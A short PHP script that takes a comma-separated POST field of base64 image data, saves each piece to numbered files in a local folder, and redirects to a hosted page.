<?php
    $ba=$_POST['ba'];
    $img = explode(",", $ba);
    $dir="./1/";
    $w=1;
    for($i=0;$i<count($img)-1;$i++){
        while(is_file($dir.$w)){
            $w++;
        }
        $myfile = fopen($dir.$w, "w");
        $txt="data:image/png;base64,".$img[$i];
        fwrite($myfile, $txt);
        fclose($myfile);
    }
    header('Location: https://c0ffeecat123.000webhostapp.com/7/1.php');
    exit();
?>